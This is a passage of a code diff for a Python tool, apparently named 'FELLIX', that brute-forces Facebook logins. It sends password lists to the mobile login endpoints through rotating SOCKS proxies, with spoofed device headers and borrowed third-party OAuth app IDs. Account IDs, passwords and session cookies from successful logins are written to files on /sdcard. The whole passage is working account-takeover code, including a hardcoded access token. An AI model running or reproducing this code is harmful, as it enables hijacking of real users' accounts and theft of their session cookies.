-            top_login = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
-            ___top_data___ = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(top_login)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(top_login)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': ___Main_Uid___,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
+            sys.stdout.write(f'\r\033[1;37m[\033[1;32m𝐅𝐄𝐋𝐋𝐈𝐗\033[1;37m]\033[1;31m-\033[1;37m[\033[1;32m%s/%s\033[1;37m]\033[1;31m-\033[1;37m[\033[1;32mOK:%s\033[1;37m]\r'%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'm.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://m.free.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'none',
+            "sec-fetch-user": '?1',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=" ".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print('\r\r\033[1;37m[\033[1;32mOK\033[1;37m]\033[1;37m ' +cid+ '\033[1;33m | \033[1;37m' +ps+  '')
+                print('\r\r\033[1;37m[\033[1;32mCOOKIE\033[1;37m]\033[1;37m ' +coki)
+                #print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+                open('/sdcard/ALIVE-OK-COOKIE', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                #print(f"\x1b[38;5;196m[CP-💉] {uid} | {ps}")
+                open('/sdcard/ALIVE-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        
+    except Exception as e:
+        pass
+def met2(uid,pss,total):
+    global ok
+    global loop
+    global cp
+    try:
+        for ps in pss:
+            session = requests.Session()
+            sys.stdout.write(f'\r\033[1;37m[\033[1;32mFELLIX-M2\033[1;37m]\033[1;31m[\033[1;33m{loop}/{total}\033[1;30m] \033[1;90m[\033[1;32mOK\033[1;30m]\033[1;37m-\033[1;32m{len(ok)}\r')
+            sys.stdout.flush()
+            models = random.choice(['SM-J100F', 'SM-J100FN', 'SM-J100H', 'SM-J100H/DD', 'SM-J100H', 'SM-J100M', 'SM-J100MU', 'SM-J100ML', 'SM-J100VPP', 'SM-J100Y', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-M526BR', 'SM-M526BR/DS', 'SM-M526B', 'SM-M526B/DS', 'SM-A326B', 'SM-A326B/DS', 'SM-A326BR/DS', 'SM-A326BR', 'SM-A326U', 'SM-A326W', 'SM-A326U1', 'SM-A326K', 'SCG08', 'SM-S326DL', 'V2027', 'V2032', 'RMX2027', 'RMX2020', 'RMX2021', 'CPH1969', 'CPH2209', 'CPH1987'])
+            ua = random.choice(ugen)
+            rr = random.randint
+            rc = random.choice
+            nip=random.choice(prox)
+            proxs = {'http': 'socks4://'+nip}
+            session.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="116"',"sec-ch-ua-mobile": "?0","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            link = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DJ7RoPw9DErv3JvP%252BnJ1xBXBdSwjGX%252BUNAU6JVUnDcfWH5KhN9YS4j0AgvlRs9dQEBrGidlP8%252FvnAU8J5NuJK94eEvTeiDPbLcAeCv4CHwf7WqnE59zBQjVuWF6qhyLdRo5bpmstezn906etyDcTjp8ZBMvxAGFK9RKI7jaepjOnfnxAeA6rGWEgO95jv67w6YZYVYPbl6tZqWvfJmAHkQA%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df86378dd-1097-4930-baf4-f8a05e469f68%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJ7RoPw9DErv3JvP%252BnJ1xBXBdSwjGX%252BUNAU6JVUnDcfWH5KhN9YS4j0AgvlRs9dQEBrGidlP8%252FvnAU8J5NuJK94eEvTeiDPbLcAeCv4CHwf7WqnE59zBQjVuWF6qhyLdRo5bpmstezn906etyDcTjp8ZBMvxAGFK9RKI7jaepjOnfnxAeA6rGWEgO95jv67w6YZYVYPbl6tZqWvfJmAHkQA%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+            data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': uid,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'false',
             'is_smart_lock': 'true',
-            'bi_xrwh': '0',
-            'pass': ___Main_Pass___,
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(top_login)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(top_login)).group(1),
-            '__dyn': '',
-            '__csr': '',
-            '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
-            '__a': '',
-            '__user': '0',
-            '_fb_noscript': 'true'}
-            ___top_head___ = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': uau,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=521182029780294&kid_directed_site=0&app_id=521182029780294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D521182029780294%26scope%3Dopenid%2Bemail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fid.condenast.com%252Finteraction%252Fopenid%252Ffacebook%252Fcomplete%26state%3DS36YbWjHL4HD73w9YA8Jm%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D29764e2e-8dec-4b28-898f-fd3c6fb68dde%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.condenast.com%2Finteraction%2Fopenid%2Ffacebook%2Fcomplete%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DS36YbWjHL4HD73w9YA8Jm%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
-            lo = session.post(url,data=___top_data___,headers=___top_head___,allow_redirects=False,proxies=proxs).text
-            ___Top_Cookies___ = session.cookies.get_dict().keys()
-            if 'c_user' in ___Top_Cookies___:
+            'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': ps,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            "__dyn": "",
+            "__csr": "",
+            "__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
+            "__a": "",
+            "__user": "0",
+            "_fb_noscript": "true"}
+            headers = {
+            'Host': 'mbasic.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': f'{str(rr(1,5))}.{str(rr(1000,5000))}',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DJ7RoPw9DErv3JvP%252BnJ1xBXBdSwjGX%252BUNAU6JVUnDcfWH5KhN9YS4j0AgvlRs9dQEBrGidlP8%252FvnAU8J5NuJK94eEvTeiDPbLcAeCv4CHwf7WqnE59zBQjVuWF6qhyLdRo5bpmstezn906etyDcTjp8ZBMvxAGFK9RKI7jaepjOnfnxAeA6rGWEgO95jv67w6YZYVYPbl6tZqWvfJmAHkQA%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df86378dd-1097-4930-baf4-f8a05e469f68%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DJ7RoPw9DErv3JvP%252BnJ1xBXBdSwjGX%252BUNAU6JVUnDcfWH5KhN9YS4j0AgvlRs9dQEBrGidlP8%252FvnAU8J5NuJK94eEvTeiDPbLcAeCv4CHwf7WqnE59zBQjVuWF6qhyLdRo5bpmstezn906etyDcTjp8ZBMvxAGFK9RKI7jaepjOnfnxAeA6rGWEgO95jv67w6YZYVYPbl6tZqWvfJmAHkQA%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="115", "Google Chrome";v="115"',
+            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="115.0.5752.200", "Google Chrome";v="115.0.5752.200"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': f'"{models}"',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': f'"{str(rr(5,15))}.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': ua,
+            'viewport-width': f'{str(rr(300,980))}',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',
+            }
+            koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
+            koki+=' m_pixel_ratio=2.625; wd=412x756'
+            params = {
+            'api_key': '166363243399924',
+            'auth_token': 'cf7c3a289d696e7ca87a5162910bd5c3',
+            'skip_api_login': '1',
+            'signed_next': '1',
+            'next': 'https://m.facebook.com/dialog/oauth?client_id=166363243399924&display=popup&redirect_uri=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm&scope=email%2Cpublic_profile%2Cuser_messenger_contact&messenger_page_id=335963307560&state=J7RoPw9DErv3JvP%2BnJ1xBXBdSwjGX%2BUNAU6JVUnDcfWH5KhN9YS4j0AgvlRs9dQEBrGidlP8%2FvnAU8J5NuJK94eEvTeiDPbLcAeCv4CHwf7WqnE59zBQjVuWF6qhyLdRo5bpmstezn906etyDcTjp8ZBMvxAGFK9RKI7jaepjOnfnxAeA6rGWEgO95jv67w6YZYVYPbl6tZqWvfJmAHkQA%3D%3D&ret=login&fbapp_pres=0&logger_id=f86378dd-1097-4930-baf4-f8a05e469f68&tp=unspecified',
+            'refsrc': 'deprecated',
+            'app_id': '166363243399924',
+            'cancel': 'https://thirdparty.aliexpress.com/fbcallback.htm?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=J7RoPw9DErv3JvP%2BnJ1xBXBdSwjGX%2BUNAU6JVUnDcfWH5KhN9YS4j0AgvlRs9dQEBrGidlP8%2FvnAU8J5NuJK94eEvTeiDPbLcAeCv4CHwf7WqnE59zBQjVuWF6qhyLdRo5bpmstezn906etyDcTjp8ZBMvxAGFK9RKI7jaepjOnfnxAeA6rGWEgO95jv67w6YZYVYPbl6tZqWvfJmAHkQA%3D%3D#_=_',
+            'lwv': '100',
+            }
+            lo = session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",params=params,cookies={'cookie': koki},headers=headers,data=data,allow_redirects=False,proxies=proxs)
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                uid = re.findall('c_user=(.*);xs', coki)[0]
-                response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
-                if 'Photoshop' in response:
-                    print(f'\r\r{W}[{G}TOP{W}-{G}OK{W}]{G} {uid} {W}|{G} {___Main_Pass___}     ');open('/sdcard/TOP/TOP-RNDM-M2-OK.txt','a').write(uid+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-RNDM-COOKIES-M2.txt','a').write(uid+'|'+___Main_Pass___+'|'+coki+'\n')
-                    print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {coki}\n')
-                    oks.append(uid)
-                else:break
-            elif 'checkpoint' in ___Top_Cookies___:
-                print(f'\r\r{W}[{R}TOP{W}-{R}CP{W}]{R} {___Main_Uid___} {W}|{R} {___Main_Pass___}       ')
-                cps.append(___Main_Uid___)
+                idf = re.findall('c_user=(.*);xs', coki)[0]
+                print('\r\r\033[1;37m[\033[1;32mALIVE\033[1;37m]\033[1;37m ' +idf+ '\033[1;33m | \033[1;37m' +ps+  '')
+                print('\r\r\033[1;37m[\033[1;32mCOOKIE\033[1;37m]\033[1;37m ' +coki)
+                open('/sdcard/ALIVE-OK-M2.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
+                ok.append(idf)
                 break
-            else:continue
+            elif 'checkpoint' in log_cookies:
+                if 'y' in cpx:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    coki1 = coki.split("1000")[1]
+                    idf = "1000"+coki1[0:11]
+                    print(f'\033[1;31m[FELLIX-CP] {idf}|{ps}')
+                    open('/sdcard/FELLIX-CP.txt','a').write(idf+'|'+ps+'\n')
+                    cp.append(idf)
+                    break
+            else:
+                continue
         loop+=1
-    except requests.exceptions.ConnectionError:time.sleep(20)
-"""-------------------------(RANDOM METHOD=2)-------------------------"""
-def ___TopRndm2___(___Main_Uid___,passlist,tl):
+    except:
+        pass
+def met3(uid,pss,total):
+    global ok
+    global loop
+    global cp
     try:
-        global oks,cps,loop,lim
-        p=round(loop*100/lim,2)
-        xoxo = random.choice(colors)
-        sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}R2{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{p}{W}]");sys.stdout.flush()
-        for ___Main_Pass___ in passlist:
-            with requests.Session() as session:
-                ua = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(5,14))}; {random.choice(mdl)} Build/QP1A.{str(random.randint(111111,999999))}.{str(random.randint(10,999))}) "+''.join(m3ua)
-                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                fahad = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':___Main_Uid___,'password':___Main_Pass___,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
-                hossain = {'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent': ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
-                refat = session.post('https://api.facebook.com/method/auth.login',data=fahad,headers=hossain,allow_redirects=False).json()
-                if 'session_key' in refat:
-                    uid=str(refat['uid'])
-                    cookie = ";".join(i["name"]+"="+i["value"] for i in refat["session_cookies"])
-                    response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
-                    if 'Photoshop' in response:
-                        print(f'\r\r{W}[{G}TOP{W}-{G}💉{W}]{G} {uid} {W}|{G} {___Main_Pass___}     ');open('/sdcard/TOP/TOP-RNDM-M2-OK.txt','a').write(uid+'|'+___Main_Pass___+'\n');open('/sdcard/TOP/TOP-RNDM-COOKIES-M2.txt','a').write(uid+'|'+___Main_Pass___+'|'+cookie+'\n')
-                        #print(f'\r\r\033[38;5;93m[{G}COOKIE\033[38;5;93m]{G} {cookie}\n')
-                        oks.append(uid)
-                    else:break
-                elif 'www.facebook.com' in refat['error_msg']:
-                    try:fid = refat['error']['error_data']['uid']
-                    except:fid = ___Main_Uid___
-                    if fid in oks:pass
-                    else:
-                        #print(f'\r\r{W}[{R}TOP{W}-{R}CP{W}]{R} {fid} {W}|{R} {___Main_Pass___}       ')
-                        cps.append(___Main_Uid___);open('/sdcard/TOP/TOP-RNDM-M2-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n')
-                        break
-                else:continue
+        for ps in pss:
+            session = requests.Session()
+            sys.stdout.write(f'\r\033[1;37m[\033[1;32mFELLIX-M3\033[1;37m]\033[1;31m[\033[1;33m{loop}/{total}\033[1;30m] \033[1;90m[\033[1;32mOK\033[1;30m]\033[1;37m-\033[1;32m{len(ok)}\r')
+            sys.stdout.flush()
+            models = random.choice(['SM-J100F', 'SM-J100FN', 'SM-J100H', 'SM-J100H/DD', 'SM-J100H', 'SM-J100M', 'SM-J100MU', 'SM-J100ML', 'SM-J100VPP', 'SM-J100Y', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-M526BR', 'SM-M526BR/DS', 'SM-M526B', 'SM-M526B/DS', 'SM-A326B', 'SM-A326B/DS', 'SM-A326BR/DS', 'SM-A326BR', 'SM-A326U', 'SM-A326W', 'SM-A326U1', 'SM-A326K', 'SCG08', 'SM-S326DL', 'V2027', 'V2032', 'RMX2027', 'RMX2020', 'RMX2021', 'CPH1969', 'CPH2209', 'CPH1987'])
+            ua = random.choice(ugen)
+            rr = random.randint
+            rc = random.choice
+            nip=random.choice(prox)
+            proxs = {'http': 'socks4://'+nip}
+            session.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="114"',"sec-ch-ua-mobile": "?0","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            link = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D142ed561-e5c8-49a4-bec4-eaa45bae67f0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+            data = {
+            'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+            'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+            'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+            'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
+            'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
+            'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
+            '_fb_noscript': 'true',
+            'email': uid,
+            'pass': ps,
+            'login': 'Masuk'
+            }
+            head = {
+            'Host': 'p.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': f'{str(rr(1,5))}.{str(rr(1000,5000))}',
+            'origin': 'https://p.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D142ed561-e5c8-49a4-bec4-eaa45bae67f0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
+            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5761.201", "Google Chrome";v="116.0.5761.201"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': f'"{models}"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': f'"{str(rr(6,13))}"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': ua,
+            'viewport-width': '421',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
